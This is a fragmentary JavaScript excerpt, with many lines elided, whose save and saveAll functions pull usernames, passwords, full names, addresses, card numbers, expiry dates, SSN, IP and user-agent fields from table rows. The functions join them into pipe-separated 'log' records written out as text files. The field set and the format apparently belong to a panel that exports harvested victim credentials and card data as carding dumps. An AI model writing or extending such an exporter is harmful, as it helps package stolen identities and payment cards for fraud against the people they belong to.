...
function save(id) {
    ...
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            ...
            // Loop through each row to extract key-value pairs
            rows.forEach(row => {
                var cells = row.querySelectorAll("td");
                if (cells.length === 2) {  // Ensure there are exactly two cells for key-value pairs
                    var key = cells[0].textContent.trim();
                    var value = cells[1].textContent.trim();

                    // Map keys to data object
                    switch (key) {
                        case 'Username': data.user = value; break;
                        case 'Password': data.pass = value; break;
                        case 'Fullname': data.fullname = value; break;
                        case 'Address': data.address = value; break;
                        case 'City': data.city = value; break;
                        case 'State': data.state = value; break;
                        case 'zip': data.zip = value; break;
            ...
            // Placeholder for fields not in the PHP response (adjust if these are in the database)
            data.country = data.country || 'United States'; // Example default
            data.ssn = data.ssn || '';
            data.phone_alt = data.phone_alt || data.phone; // Use primary phone if no alternate
            data.ip_address = data.ip_address || '';
            data.useragent = data.useragent || '';

            // Create pipe-separated string matching the desired format
            var log = [
                data.card,
                exp_month,
                exp_year,
            ...
            // Create a text file from the log content
...
function saveAll() {
    ...
    .then(parsed_data => {
        if (parsed_data.status === 'ok') {
            ...
            // Initialize an array to store pipe-separated records
            let records = [];
            ...
            // Loop through each table to process user data
            tables.forEach((table) => {
                // Initialize data object for the current user
                let data = {
                    user: '',
                    pass: '',
                    fullname: '',
                ...
                // Placeholder for fields not in the PHP response
                data.country = data.country || 'United States'; // Example default
                data.ssn = data.ssn || '';
                data.phone_alt = data.phone_alt || data.phone; // Use primary phone if no alternate
                data.ip_address = data.ip_address || '';
                ...
                // Create pipe-separated string for this user
                const record = [
                    data.card,
                    exp_month,
                    exp_year,
            ...
            // Combine all records with newlines
